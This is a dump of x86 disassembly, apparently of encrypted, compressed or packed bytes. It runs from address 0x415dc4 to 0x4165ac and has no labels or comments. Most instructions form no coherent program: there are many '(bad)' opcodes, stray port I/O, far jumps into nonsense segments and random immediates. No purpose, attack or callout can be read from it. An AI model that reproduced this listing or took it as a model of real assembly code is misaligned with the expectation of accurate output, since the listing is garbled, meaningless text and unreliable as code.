  415dc4:	cs cld 
  415dc6:	arpl   si,di
  415dc8:	arpl   si,dx
  415dca:	pop    esp
  415dcb:	mov    ebx,0xe6c52d2f
  415dd0:	in     eax,dx
  415dd1:	sub    DWORD PTR [edi],esp
  415dd3:	mov    ah,bh
  415dd5:	mov    esp,0x953488fd
  415dda:	mov    eax,0xaa83a33f
  415ddf:	cmc    
  415de0:	fild   QWORD PTR [edx-0x5d]
  415de3:	fisub  DWORD PTR [ebx+eiz*4]
  415de6:	or     al,0xa7
  415de8:	lock jg 0x415d95
  415deb:	sbb    DWORD PTR [ebp+0x24],eax
  415dee:	inc    eax
  415def:	repnz or BYTE PTR [edi-0x2a4c954a],al
  415df6:	out    0x1a,al
  415df8:	mov    al,ds:0x4faf3246
  415dfd:	ds inc esp
  415dff:	in     eax,dx
  415e00:	retf   0x7834
  415e03:	out    0xdb,al
  415e05:	xchg   esi,eax
  415e06:	pop    es
  415e07:	dec    ecx
  415e08:	push   edi
  415e09:	(bad)  
  415e0a:	mov    edi,0x9899ddd0
  415e0f:	ret    
  415e10:	loope  0x415dc5
  415e12:	pusha  
  415e13:	mov    al,fs:0x68c794bb
  415e19:	stos   BYTE PTR es:[edi],al
  415e1a:	xchg   edx,eax
  415e1b:	and    bh,0x54
  415e1e:	leave  
  415e1f:	add    ebx,edx
  415e21:	(bad)
  415e25:	pop    esi
  415e26:	cmp    eax,0xdb22f508
  415e2b:	mov    dl,0x9b
  415e2d:	jbe    0x415de4
  415e2f:	jno    0x415db1
  415e31:	push   0xc4ef18f3
  415e36:	std    
  415e37:	and    BYTE PTR [edi+0x3d],0xa3
  415e3b:	and    al,ah
  415e3d:	imul   eax,DWORD PTR [eax+0x7a036539],0x6175029a
  415e47:	cmp    al,dl
  415e49:	lods   al,BYTE PTR ds:[esi]
  415e4a:	add    eax,0xf850f53b
  415e4f:	bnd addr16 jge 0x415ea4
  415e53:	out    0x49,eax
  415e55:	cmp    al,0x52
  415e57:	fwait
  415e58:	popf   
  415e59:	jb     0x415de6
  415e5b:	dec    esp
  415e5c:	xlat   BYTE PTR ds:[ebx]
  415e5d:	jge    0x415df5
  415e5f:	mov    dl,0x5f
  415e61:	mov    BYTE PTR [esi+0x3a],ch
  415e64:	mov    bh,0x4a
  415e66:	adc    eax,0x528f94f
  415e6b:	jns    0x415e69
  415e6d:	xor    DWORD PTR [ebp-0x68],0xf59da061
  415e74:	shr    BYTE PTR ds:0xdb63ca5d,1
  415e7a:	ror    BYTE PTR [di],1
  415e7d:	push   ecx
  415e7e:	dec    edi
  415e7f:	sahf   
  415e80:	and    esi,DWORD PTR [ebp-0x20bd4c88]
  415e86:	into   
  415e87:	dec    edx
  415e88:	inc    ecx
  415e89:	dec    BYTE PTR [esi]
  415e8b:	data16 jbe 0x415e27
  415e8e:	fnsave [edi+0x1fb68573]
  415e94:	inc    ebx
  415e95:	pop    ecx
  415e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e97:	ret    
  415e98:	test   DWORD PTR [edx-0x2f],esi
  415e9b:	iret   
  415e9c:	sbb    al,0x61
  415e9e:	gs pop ds
  415ea0:	scas   al,BYTE PTR es:[edi]
  415ea1:	mov    WORD PTR [edi],gs
  415ea3:	ja     0x415f16
  415ea5:	jns    0x415e35
  415ea7:	test   DWORD PTR [ebp+0x1774f101],esi
  415ead:	cmp    eax,0x37255d59
  415eb2:	int3   
  415eb3:	mov    cl,0xe1
  415eb5:	retf   0xe908
  415eb8:	cmp    eax,DWORD PTR [edi-0x21]
  415ebb:	xchg   ebx,eax
  415ebc:	inc    eax
  415ebd:	mov    edi,0x30e100a4
  415ec2:	jb     0x415eab
  415ec4:	inc    eax
  415ec5:	mov    WORD PTR [ebx],es
  415ec7:	or     al,0x1
  415ec9:	or     ecx,esp
  415ecb:	ret    0x80a2
  415ece:	int3   
  415ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed0:	int3   
  415ed1:	push   ss
  415ed2:	sbb    ebx,DWORD PTR [eax-0x40b1b871]
  415ed8:	mov    bl,0xc6
  415eda:	bound  edi,QWORD PTR [eax+0x37]
  415edd:	loope  0x415ed0
  415edf:	cdq    
  415ee0:	cmp    eax,0xfabe1a7f
  415ee5:	les    edi,FWORD PTR [eax+0x2dc732d3]
  415eeb:	clc    
  415eec:	xor    edi,esi
  415eee:	inc    ebp
  415eef:	jbe    0x415f1f
  415ef1:	cwde   
  415ef2:	jns    0x415e86
  415ef4:	in     eax,0xf1
  415ef6:	or     al,0x34
  415ef8:	xchg   ebx,eax
  415ef9:	pop    esp
  415efa:	cmp    esi,DWORD PTR [eax]
  415efc:	test   DWORD PTR gs:[esi+ebp*2+0x48],0x7156512e
  415f05:	xor    bl,cl
  415f07:	xchg   DWORD PTR ds:0xdeee4c3f,esp
  415f0d:	sub    BYTE PTR [ecx-0x6f],bh
  415f10:	pushf  
  415f11:	loopne 0x415f24
  415f13:	pop    ebp
  415f14:	xor    al,0xa
  415f16:	mov    dh,0xd2
  415f18:	jo     0x415eeb
  415f1a:	mov    bl,0x5d
  415f1c:	mov    dl,0xd3
  415f1e:	push   0xb42c089c
  415f23:	ins    DWORD PTR es:[edi],dx
  415f24:	dec    esp
  415f25:	add    edx,DWORD PTR [ecx-0x55]
  415f28:	xor    edx,ebx
  415f2a:	je     0x415fa1
  415f2c:	push   0xffffffd2
  415f2e:	sbb    DWORD PTR [edx+edi*8-0x719c309c],0xffffffe4
  415f36:	mov    ds:0xd9327c92,eax
  415f3b:	jno    0x415f35
  415f3d:	pusha  
  415f3e:	and    esi,DWORD PTR [ebp+0x5831c651]
  415f44:	stos   DWORD PTR es:[edi],eax
  415f45:	into   
  415f46:	sbb    eax,0x1654252c
  415f4b:	mov    edx,0x1fe4b3e1
  415f50:	fcmovu st,st(7)
  415f52:	push   esi
  415f53:	mov    esp,0xe80b54de
  415f58:	mov    esi,0x18e87f63
  415f5d:	aaa    
  415f5e:	cmp    ebp,DWORD PTR [ebx+eiz*2-0x10]
  415f62:	ins    DWORD PTR es:[edi],dx
  415f63:	fyl2xp1 
  415f65:	mov    ah,0xe6
  415f67:	push   es
  415f68:	dec    edi
  415f69:	ret    
  415f6a:	pusha  
  415f6b:	dec    ecx
  415f6c:	in     al,dx
  415f6d:	dec    eax
  415f6e:	nop
  415f6f:	call   0xc60e:0xb0b31e5d
  415f76:	lahf   
  415f77:	pop    edi
  415f78:	je     0x415fed
  415f7a:	xlat   BYTE PTR ds:[ebx]
  415f7b:	leave  
  415f7c:	cmp    al,0x2f
  415f7e:	ucomiss xmm2,DWORD PTR [esi+ebp*1+0x50]
  415f83:	mov    esi,0x489f8392
  415f88:	push   eax
  415f89:	nop
  415f8a:	addr16 fwait
  415f8c:	and    DWORD PTR [eax-0x58],edx
  415f8f:	lds    esp,FWORD PTR [eax+0x39a039be]
  415f95:	inc    ecx
  415f96:	lods   al,BYTE PTR ds:[esi]
  415f97:	add    al,0xf
  415f99:	mov    ds:0x2dc32946,eax
  415f9e:	inc    eax
  415f9f:	xor    al,0x40
  415fa1:	cmp    eax,0xa808a982
  415fa6:	lods   al,BYTE PTR ds:[esi]
  415fa7:	push   eax
  415fa8:	lock sub eax,0x7e5a9e4f
  415fae:	int    0xca
  415fb0:	cmp    DWORD PTR [ecx+0x39ffc762],esp
  415fb6:	push   esp
  415fb7:	in     al,dx
  415fb8:	lods   al,BYTE PTR ds:[esi]
  415fb9:	(bad)  [edi]
  415fbb:	in     al,0xbb
  415fbd:	pushf  
  415fbe:	push   ebx
  415fbf:	dec    esi
  415fc0:	mov    ebx,0xab9da3b9
  415fc5:	jmp    0x84907f3e
  415fca:	mov    edi,cs
  415fcc:	push   esi
  415fcd:	lods   al,BYTE PTR ds:[esi]
  415fce:	out    0xb3,al
  415fd0:	sub    al,0x9
  415fd2:	sti    
  415fd3:	test   al,0x88
  415fd5:	xchg   esi,eax
  415fd6:	dec    eax
  415fd7:	in     al,dx
  415fd8:	add    cl,BYTE PTR [esi+esi*1-0x6e685b16]
  415fdf:	sbb    al,0xb8
  415fe1:	pop    edx
  415fe2:	iret   
  415fe3:	jbe    0x415f84
  415fe5:	scas   al,BYTE PTR es:[edi]
  415fe6:	adc    BYTE PTR [edi-0x14502d54],0x5
  415fed:	jl     0x416008
  415fef:	mov    ds:0xf1fbd8ce,al
  415ff4:	add    dh,bl
  415ff6:	and    al,0xdb
  415ff8:	sub    bh,ah
  415ffa:	js     0x415fb2
  415ffc:	or     dl,ch
  415ffe:	inc    edx
  415fff:	xchg   ebp,eax
  416000:	es (bad) 
  416002:	jno    0x41605d
  416004:	ds into 
  416006:	sbb    al,0xca
  416008:	aam    0x1d
  41600a:	(bad)  
  41600b:	lahf   
  41600c:	adc    ch,BYTE PTR [edi]
  41600e:	iret   
  41600f:	jge    0x415fe0
  416011:	xlat   BYTE PTR ds:[ebx]
  416012:	pusha  
  416013:	xor    dl,BYTE PTR [edi+0x44]
  416016:	mov    ds:0x77e9b2,eax
  41601b:	mov    al,ds:0x60ecb46a
  416020:	lds    edx,FWORD PTR ds:0x85e07f48
  416026:	das    
  416027:	xor    edi,DWORD PTR [edx+0x67]
  41602a:	jbe    0x41602d
  41602c:	in     eax,dx
  41602d:	pop    eax
  41602e:	daa    
  41602f:	das    
  416030:	sbb    ecx,edi
  416032:	cdq    
  416033:	and    ebp,DWORD PTR [esi+edx*2-0x6]
  416037:	push   0xffffffd2
  416039:	add    cl,0x5d
  41603c:	push   DWORD PTR [eax-0x24]
  41603f:	outs   dx,DWORD PTR ds:[esi]
  416040:	sahf   
  416041:	inc    ebx
  416042:	cmp    al,0x53
  416044:	pop    es
  416045:	pop    eax
  416046:	imul   ebp,esi,0xeda8fcd0
  41604c:	ja     0x4160a7
  41604e:	fbld   TBYTE PTR [edx-0x2c]
  416051:	sub    BYTE PTR [ebp-0x643f78e4],ch
  416057:	faddp  st(1),st
  416059:	dec    ecx
  41605a:	and    dl,BYTE PTR [esi+0x36a50638]
  416060:	dec    esi
  416061:	push   ecx
  416062:	stos   DWORD PTR es:[edi],eax
  416063:	jmp    0xbde2:0xd1f84b0e
  41606a:	pushf  
  41606b:	call   FWORD PTR [ecx]
  41606d:	lock sub BYTE PTR [ecx],ah
  416070:	lahf   
  416071:	or     BYTE PTR [ecx],al
  416073:	jne    0x416054
  416075:	xchg   ebx,eax
  416076:	xchg   ebp,eax
  416077:	das    
  416078:	lock enter 0x27a4,0x96
  41607d:	mov    ah,0xdc
  41607f:	cld    
  416080:	sahf   
  416081:	cmc    
  416082:	stos   BYTE PTR es:[edi],al
  416083:	or     DWORD PTR [esi+0x15b5ba97],esi
  416089:	xchg   ecx,eax
  41608a:	je     0x4160c1
  41608c:	cmc    
  41608d:	jl     0x416068
  41608f:	test   ecx,esp
  416091:	add    al,0x4e
  416093:	aaa    
  416094:	(bad)  
  416095:	xchg   esp,eax
  416096:	mov    ah,0x3b
  416098:	arpl   WORD PTR [ecx],cx
  41609a:	push   esp
  41609b:	push   ebp
  41609c:	mov    eax,0xe2eeb08d
  4160a1:	stc    
  4160a2:	dec    edx
  4160a3:	and    al,BYTE PTR [edi-0x7e]
  4160a6:	ret    
  4160a7:	dec    esi
  4160a8:	jbe    0x4160da
  4160aa:	sahf   
  4160ab:	in     al,dx
  4160ac:	mov    eax,0x79bbc94d
  4160b1:	hlt    
  4160b2:	xchg   edx,ebx
  4160b4:	xor    edi,DWORD PTR [edi-0x2f]
  4160b7:	out    dx,eax
  4160b8:	fwait
  4160b9:	push   edi
  4160ba:	aas    
  4160bb:	(bad)  
  4160bc:	push   0x5e0c142c
  4160c1:	and    al,0xb1
  4160c3:	xor    al,0x7a
  4160c5:	outs   dx,DWORD PTR ds:[esi]
  4160c6:	and    bh,dh
  4160c8:	fwait
  4160c9:	jbe    0x4160ab
  4160cb:	jb     0x4160e1
  4160cd:	pop    edi
  4160ce:	dec    ebx
  4160cf:	addr16 mov ebx,ds
  4160d2:	adc    edi,DWORD PTR [edx-0x77b7fc17]
  4160d8:	in     al,dx
  4160d9:	jns    0x416158
  4160db:	mov    WORD PTR [edi-0x80],ds
  4160de:	test   al,0x95
  4160e0:	sbb    al,0xbe
  4160e2:	mov    ds:0xa7fabef4,al
  4160e7:	lock and BYTE PTR [edx+0xa],dl
  4160eb:	in     eax,dx
  4160ec:	sar    DWORD PTR [ecx-0x61],cl
  4160ef:	pop    es
  4160f0:	push   edi
  4160f1:	les    esp,FWORD PTR [ebx]
  4160f3:	rcr    BYTE PTR [eax-0xe],cl
  4160f6:	inc    ecx
  4160f7:	pop    ebx
  4160f8:	and    eax,0x7468a6bd
  4160fd:	add    esi,DWORD PTR [edi]
  4160ff:	je     0x4160a8
  416101:	add    esp,DWORD PTR [eax-0x7644c294]
  416107:	repnz xchg ebx,eax
  416109:	adc    DWORD PTR [ebp+ebp*4-0x3e],ebp
  41610d:	dec    esp
  41610e:	and    edi,esp
  416110:	cld    
  416111:	addr16 (bad) 
  416113:	aad    0x8b
  416115:	mov    al,ds:0xc18a3b17
  41611a:	arpl   WORD PTR [ebx+0x1d],cx
  41611d:	dec    edi
  41611e:	(bad)  
  41611f:	jnp    0x416152
  416121:	mov    esi,0x8a32d265
  416126:	xor    DWORD PTR [edi-0xa],esi
  416129:	mov    cl,0x4b
  41612b:	mov    bl,bh
  41612d:	jne    0x41618e
  41612f:	pop    edx
  416130:	adc    ah,BYTE PTR ds:0x99b0e1e4
  416136:	es push cs
  416138:	xchg   ebx,eax
  416139:	in     eax,dx
  41613a:	and    al,0x12
  41613c:	dec    edi
  41613d:	xchg   ebx,eax
  41613e:	lahf   
  41613f:	and    edi,ecx
  416141:	inc    edx
  416142:	rol    ebx,0xd6
  416145:	test   BYTE PTR [edx],dl
  416147:	add    eax,0xbb98bf03
  41614c:	add    bh,BYTE PTR [ebx]
  41614e:	aad    0xc5
  416150:	xor    esp,DWORD PTR [ecx]
  416152:	sbb    al,0x68
  416154:	mov    al,ds:0x206fe0e9
  416159:	mov    al,ds:0xdc3b9491
  41615e:	xor    eax,0xb302465a
  416163:	pushf  
  416164:	add    BYTE PTR [ebp-0x65],bl
  416167:	jo     0x4161e0
  416169:	out    0xe8,eax
  41616b:	push   ss
  41616c:	les    esi,FWORD PTR [edi]
  41616e:	call   0x8755:0x31ad4a49
  416175:	ror    DWORD PTR [ebp-0x6f82b85d],1
  41617b:	sbb    dh,BYTE PTR [ecx+0x42]
  41617e:	stos   BYTE PTR es:[edi],al
  41617f:	aaa    
  416180:	iret   
  416181:	aam    0xbc
  416183:	or     eax,0x86a4ddf4
  416188:	(bad)  
  416189:	inc    BYTE PTR [ecx+0x6d]
  41618c:	jl     0x416180
  41618e:	add    eax,0x475aafa5
  416193:	dec    ebx
  416194:	xchg   esp,eax
  416195:	adc    DWORD PTR [ebx+ecx*8],0xffffffab
  416199:	sbb    eax,0x34252c0e
  41619e:	inc    ebp
  41619f:	mov    ebx,DWORD PTR [edi]
  4161a1:	ror    esp,1
  4161a3:	idiv   DWORD PTR [eax-0x5]
  4161a6:	bound  eax,QWORD PTR [ebx+eax*1+0x776f68d0]
  4161ad:	fs inc edi
  4161af:	cmc    
  4161b0:	int3   
  4161b1:	in     al,dx
  4161b2:	iret   
  4161b3:	jle    0x41618f
  4161b5:	sub    BYTE PTR [esi-0x29],0x5f
  4161b9:	cld    
  4161ba:	fwait
  4161bb:	push   esp
  4161bc:	retf   
  4161bd:	adc    esp,DWORD PTR [esi+0x16b3bc0a]
  4161c3:	retf   
  4161c4:	sub    ecx,eax
  4161c6:	js     0x4161ed
  4161c8:	mov    eax,ds:0x43555e36
  4161cd:	retf   0x1e45
  4161d0:	sbb    eax,DWORD PTR [ecx-0x1a]
  4161d3:	jmp    0x39ac:0x9fc3e114
  4161da:	mov    cl,0x1b
  4161dc:	jbe    0x416176
  4161de:	hlt    
  4161df:	pushf  
  4161e0:	cmp    eax,DWORD PTR [ecx+0x3c21c1a6]
  4161e6:	adc    BYTE PTR [ecx],0x19
  4161e9:	outs   dx,BYTE PTR ds:[esi]
  4161ea:	scas   eax,DWORD PTR es:[edi]
  4161eb:	push   ecx
  4161ec:	dec    ecx
  4161ed:	mov    DWORD PTR [ecx-0x10d33fc0],ebp
  4161f3:	xor    eax,0xff1be007
  4161f8:	sub    eax,0xecaf6fe1
  4161fd:	pop    esi
  4161fe:	inc    edi
  4161ff:	(bad)  
  416201:	or     al,0x9d
  416203:	pop    ebx
  416204:	push   ds
  416205:	int    0x8
  416207:	cli    
  416208:	(bad)  
  416209:	pushf  
  41620a:	dec    esp
  41620b:	(bad)  
  41620c:	js     0x41628c
  41620e:	outs   dx,DWORD PTR ds:[esi]
  41620f:	addr16 mov esi,0xda5cbff
  416215:	mov    ds:0xb64915f4,eax
  41621a:	loop   0x4161a4
  41621c:	aam    0x43
  41621e:	fldcw  WORD PTR [ebp+0x4ea60886]
  416224:	sbb    eax,DWORD PTR [ebx+0x6ac10c04]
  41622a:	std    
  41622b:	cwde   
  41622c:	fistp  QWORD PTR ds:0x857f69f8
  416232:	cmc    
  416233:	mov    ebp,0x711cf500
  416238:	lock inc ebx
  41623a:	xlat   BYTE PTR ds:[ebx]
  41623b:	xor    esp,DWORD PTR [eax]
  41623d:	arpl   WORD PTR [ecx-0x40],dx
  416240:	nop
  416241:	cmp    al,0x4d
  416243:	test   eax,0xed7a0a1f
  416248:	pop    ss
  416249:	sbb    BYTE PTR [eax],bh
  41624b:	stc    
  41624c:	aaa    
  41624d:	xor    DWORD PTR [esp+ecx*1],ebp
  416250:	lahf   
  416251:	test   al,0x2b
  416253:	leave  
  416254:	adc    bl,BYTE PTR [ebp+0x4cc146b9]
  41625a:	sbb    DWORD PTR [esi+0x6b],ebp
  41625d:	sub    BYTE PTR [eax+ecx*8+0x1a6b23ab],ch
  416264:	cmp    al,cl
  416266:	sbb    BYTE PTR [eax-0x75],dl
  416269:	out    0x9e,eax
  41626b:	or     eax,0x8adff31f
  416270:	xor    edx,ecx
  416272:	imul   eax,DWORD PTR [ebx+0x39b259b5],0x374cc65
  41627c:	xor    al,0x23
  41627e:	pop    ebx
  41627f:	mov    ecx,0xfd3801b4
  416284:	add    eax,0x9d6a3d73
  416289:	popf   
  41628a:	std    
  41628b:	jne    0x41620f
  41628d:	pop    ss
  41628e:	pop    ebx
  41628f:	mov    WORD PTR ds:0xad98b9e3,fs
  416295:	cmp    BYTE PTR [eax+edi*8+0x543efbf2],cl
  41629c:	sar    ebx,cl
  41629e:	or     ch,BYTE PTR [ecx+0x7adb1601]
  4162a4:	dec    ebx
  4162a5:	xor    edi,DWORD PTR [edx]
  4162a7:	leave  
  4162a8:	ja     0x4162dc
  4162aa:	xchg   esp,eax
  4162ab:	(bad)  
  4162ac:	fisttp DWORD PTR [edi-0x7]
  4162af:	sub    DWORD PTR [edx+0x47fdfc0a],ebp
  4162b5:	sti    
  4162b6:	dec    ebx
  4162b7:	sub    eax,0xa6d63a55
  4162bc:	lock stc 
  4162be:	mov    ebx,0xff23457d
  4162c3:	outs   dx,DWORD PTR ds:[esi]
  4162c4:	jge    0x41628e
  4162c6:	jp     0x4162f5
  4162c8:	jle    0x41628e
  4162ca:	cmp    esi,DWORD PTR [ebp-0x5b]
  4162cd:	mov    ebp,0x8a60186c
  4162d2:	or     edi,ebp
  4162d4:	mov    edi,0x8d92469b
  4162d9:	jnp    0x41635a
  4162db:	xchg   edx,eax
  4162dc:	jns    0x4162c4
  4162de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162df:	xchg   esi,eax
  4162e0:	ret    
  4162e1:	dec    edi
  4162e2:	rol    ebx,0xe9
  4162e5:	and    BYTE PTR [ebx+eiz*2],dl
  4162e8:	hlt    
  4162e9:	pop    es
  4162ea:	mov    eax,ds:0x36051684
  4162ef:	mov    ch,BYTE PTR [ebx-0x55]
  4162f2:	mov    esp,0xe99eb51c
  4162f7:	test   DWORD PTR [edi],0x1b3b8f5e
  4162fd:	jle    0x4162f5
  4162ff:	sar    DWORD PTR [ecx-0x529ec06f],1
  416305:	inc    esi
  416306:	jg     0x41631d
  416308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416309:	xchg   esi,eax
  41630a:	jmp    0xc30:0xa0476f72
  416311:	sbb    DWORD PTR [eax-0x73b8aee7],ebx
  416317:	cli    
  416318:	in     eax,0xfa
  41631a:	inc    ecx
  41631b:	test   BYTE PTR [ebx+0x40],dh
  41631e:	mov    esi,0xe591268c
  416323:	ret    
  416324:	or     DWORD PTR [edi+eax*1+0x72423cab],ebp
  41632b:	dec    ecx
  41632c:	xor    eax,0x6f564fca
  416331:	xchg   ebp,eax
  416332:	daa    
  416333:	or     eax,0x55585713
  416338:	cli    
  416339:	sub    dh,BYTE PTR [ecx-0x40bd5970]
  41633f:	cmp    edx,edx
  416341:	sub    edx,ecx
  416343:	fs jno 0x41639e
  416346:	and    eax,0x34459104
  41634b:	push   ss
  41634c:	sub    DWORD PTR [esi+0x3],ebp
  41634f:	fwait
  416350:	(bad)  
  416351:	in     al,dx
  416352:	inc    esi
  416353:	pusha  
  416354:	adc    ebp,edi
  416356:	push   0x76
  416358:	clc    
  416359:	push   esp
  41635b:	sbb    DWORD PTR [esi+0xe],ecx
  41635e:	jge    0x416395
  416360:	adc    eax,0x8924e97a
  416365:	je     0x4162f1
  416367:	clc    
  416368:	ja     0x41632d
  41636a:	pop    eax
  41636b:	test   eax,0x41ad2433
  416370:	pop    edx
  416371:	sub    eax,0xec31d82b
  416376:	inc    eax
  416377:	test   eax,0xb37185dc
  41637c:	lea    edi,ds:0x6b0a0e15
  416382:	imul   edx,DWORD PTR [ecx],0x69c6be5e
  416388:	xlat   BYTE PTR ds:[ebx]
  416389:	repz test eax,0xa86da99d
  41638f:	xchg   esi,eax
  416390:	cmc    
  416391:	shl    DWORD PTR [ebx*1+0x4e74b378],0x5e
  416399:	sub    eax,0x72f7e2f5
  41639e:	cdq    
  41639f:	jmp    0x416326
  4163a1:	(bad)  
  4163a2:	jle    0x416335
  4163a4:	pop    ss
  4163a5:	sub    BYTE PTR [ecx+edx*4+0x64289bd4],dl
  4163ac:	adc    BYTE PTR [ecx-0x2e5d7c7a],bh
  4163b2:	sub    eax,DWORD PTR [edx]
  4163b4:	scas   al,BYTE PTR es:[edi]
  4163b5:	loopne 0x4163cb
  4163b7:	add    eax,0x5eab9853
  4163bc:	and    bl,BYTE PTR [edx-0x6a273c58]
  4163c2:	and    al,0x35
  4163c4:	and    al,0x68
  4163c6:	out    dx,eax
  4163c7:	jns    0x4163f7
  4163c9:	xor    eax,0x60fa2075
  4163ce:	ins    DWORD PTR es:[edi],dx
  4163cf:	mov    ecx,0xda27653e
  4163d4:	into   
  4163d5:	push   ds
  4163d6:	ret    0x8417
  4163d9:	cld    
  4163da:	push   esi
  4163db:	inc    edi
  4163dc:	mov    esi,0x2f41221a
  4163e1:	inc    ecx
  4163e2:	ds adc eax,0x95b7e5ac
  4163e8:	cwde   
  4163e9:	clc    
  4163ea:	aas    
  4163eb:	jecxz  0x416428
  4163ed:	sbb    al,0x2c
  4163ef:	(bad)  
  4163f1:	dec    edi
  4163f2:	stos   BYTE PTR es:[edi],al
  4163f3:	mov    eax,ds:0x5722c7fd
  4163f8:	push   ecx
  4163f9:	xchg   esp,eax
  4163fa:	adc    al,0x39
  4163fc:	and    BYTE PTR [ebx-0x11794819],dh
  416402:	cli    
  416403:	call   0x63c06c5e
  416408:	add    ebp,eax
  41640a:	mov    ds:0xfb98816e,eax
  41640f:	jb     0x4163f7
  416411:	xor    al,0xc2
  416413:	repz test DWORD PTR [eax+0x34],0x58515f08
  41641b:	iret   
  41641c:	stc    
  41641d:	dec    edx
  41641e:	ror    eax,1
  416420:	call   0x6e5ecc29
  416425:	add    eax,0x237d827d
  41642a:	or     DWORD PTR [ecx+0x287e8e9a],0xffffffe1
  416431:	mov    ah,0x5e
  416433:	into   
  416434:	mov    eax,ds:0xbe6bdba5
  416439:	fld    DWORD PTR [esi+edx*1-0x38]
  41643d:	out    0x85,al
  41643f:	dec    ebp
  416440:	fwait
  416441:	mov    ch,0x92
  416443:	mov    ch,0x94
  416445:	leave  
  416446:	adc    BYTE PTR [ebp-0x4a8d79fe],bl
  41644c:	mov    ebp,0x4efeaea3
  416451:	cmp    WORD PTR [esi-0x30],0x85c
  416457:	rol    BYTE PTR [edx+0x45119778],1
  41645d:	loopne 0x4164a8
  41645f:	pop    edi
  416460:	cmp    ecx,esi
  416462:	fwait
  416463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416464:	pop    ebp
  416465:	push   0xa5300129
  41646a:	jl     0x4164d5
  41646c:	pop    esi
  41646d:	inc    esp
  41646e:	aaa    
  41646f:	mov    bh,ah
  416471:	scas   al,BYTE PTR es:[edi]
  416472:	inc    edi
  416473:	aas    
  416474:	xchg   edx,eax
  416475:	mov    ecx,0x255b6be3
  41647a:	(bad)  
  41647b:	sub    ch,BYTE PTR gs:[bx]
  41647f:	hlt    
  416480:	xor    eax,0xea7f5003
  416485:	mov    cs:0xd8d99e69,al
  41648b:	xchg   DWORD PTR [edx+0x1b],esp
  41648e:	adc    BYTE PTR [ebx-0x66],bh
  416491:	xchg   edx,eax
  416492:	mov    ecx,0x70d6fa20
  416497:	mov    bh,0x21
  41649a:	xor    dl,BYTE PTR [eax-0xec19ce7]
  4164a0:	dec    ecx
  4164a1:	into   
  4164a2:	pop    ds
  4164a3:	shl    DWORD PTR [eax],1
  4164a5:	push   0xf12974e1
  4164aa:	fwait
  4164ab:	sbb    eax,ebp
  4164ad:	xchg   ebp,eax
  4164ae:	and    eax,0xa9e635ed
  4164b3:	lods   eax,DWORD PTR ds:[esi]
  4164b4:	jo     0x41646e
  4164b6:	push   esi
  4164b7:	(bad)  [edi]
  4164b9:	in     eax,0x67
  4164bb:	retf   
  4164bc:	and    DWORD PTR [esp+ebp*1+0x10939f51],edi
  4164c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c4:	jno    0x416452
  4164c6:	or     bh,BYTE PTR [ebx-0x492ee4b6]
  4164cc:	pop    es
  4164cd:	and    ebp,DWORD PTR [eax]
  4164cf:	mov    ds:0xc21b23e5,al
  4164d4:	add    al,0xda
  4164d6:	jbe    0x41647f
  4164d8:	pop    ebx
  4164d9:	stos   BYTE PTR es:[edi],al
  4164da:	aad    0x95
  4164dc:	add    eax,0xfbe09a02
  4164e1:	push   ecx
  4164e2:	fwait
  4164e3:	or     BYTE PTR [ecx+esi*2-0x297085cc],cl
  4164ea:	mov    bl,0x8e
  4164ec:	dec    ebp
  4164ed:	popf   
  4164ee:	pop    ebp
  4164ef:	sub    al,0x3
  4164f1:	nop
  4164f2:	dec    esi
  4164f3:	add    DWORD PTR ds:0x91eb9e2d,ecx
  4164f9:	scas   al,BYTE PTR es:[edi]
  4164fa:	retf   0xe18b
  4164fd:	xlat   BYTE PTR ds:[ebx]
  4164fe:	pop    ss
  4164ff:	popa   
  416500:	mov    WORD PTR [esi],?
  416502:	dec    edi
  416503:	fcomp  QWORD PTR [edi]
  416505:	mov    bh,0x8d
  416507:	shl    BYTE PTR [eax],1
  416509:	jge    0x4164e9
  41650b:	xor    dh,dl
  41650d:	mov    ch,BYTE PTR [esi]
  41650f:	mov    ds:0x967bba36,al
  416514:	int3   
  416515:	or     DWORD PTR [ebp-0x61],edx
  416518:	xchg   ebx,eax
  416519:	push   es
  41651a:	mov    cl,0x63
  41651c:	inc    eax
  41651d:	aaa    
  41651e:	xchg   esi,eax
  41651f:	push   edx
  416520:	mov    eax,ds:0xc3ba4dd0
  416525:	sub    al,0x57
  416527:	xchg   esp,eax
  416528:	nop
  416529:	pop    esp
  41652a:	gs push 0x7e8b8d71
  416530:	add    ah,al
  416532:	ss out 0x4d,al
  416535:	leave  
  416536:	retf   
  416537:	out    dx,al
  416538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416539:	fmul   QWORD PTR [ebp-0x24d4d780]
  41653f:	inc    DWORD PTR [esi]
  416541:	xchg   al,ah
  416543:	shl    BYTE PTR [edi-0x7c],1
  416546:	ret    0xeb3c
  416549:	adc    eax,DWORD PTR [edi+0x26]
  41654c:	dec    esp
  41654d:	and    eax,DWORD PTR [ebx]
  41654f:	repnz fsubr DWORD PTR [ecx-0xc]
  416553:	jge    0x4164e0
  416555:	xchg   ecx,eax
  416556:	pop    ss
  416557:	mov    BYTE PTR [ecx+0x3f9ddd61],dl
  41655d:	pop    eax
  41655e:	arpl   bp,si
  416560:	cmp    ebx,DWORD PTR [ebp+0x5d]
  416563:	cmp    bl,ch
  416565:	sar    BYTE PTR [ebx],0x20
  416568:	inc    edx
  416569:	(bad)  
  41656a:	xchg   ebx,eax
  41656b:	dec    edi
  41656c:	into   
  41656d:	es mov ebx,0xf98e80f9
  416573:	inc    ebx
  416574:	stos   BYTE PTR es:[edi],al
  416575:	sti    
  416576:	in     al,0xe8
  416578:	ret    
  416579:	clc    
  41657a:	cmp    ebx,0x6411d272
  416580:	outs   dx,BYTE PTR ds:[esi]
  416581:	and    eax,0x7ba5f107
  416586:	jg     0x4165f4
  416588:	cdq    
  416589:	mov    WORD PTR [ebx+0x2d54b9c0],?
  41658f:	and    DWORD PTR [ebp+0x6f],ebp
  416592:	out    0x57,eax
  416594:	push   0xffffffeb
  416596:	jb     0x416549
  416598:	xchg   esi,eax
  416599:	loope  0x41657b
  41659b:	aam    0x2f
  41659d:	gs dec eax
  41659f:	push   0x6ef03e34
  4165a4:	xchg   ecx,eax
  4165a5:	aad    0xf0
  4165a7:	(bad)  
  4165a8:	aam    0xbc
  4165aa:	clc    
  4165ab:	into   
  4165ac:	or     bl,BYTE PTR [ebp-0x7675bd70]
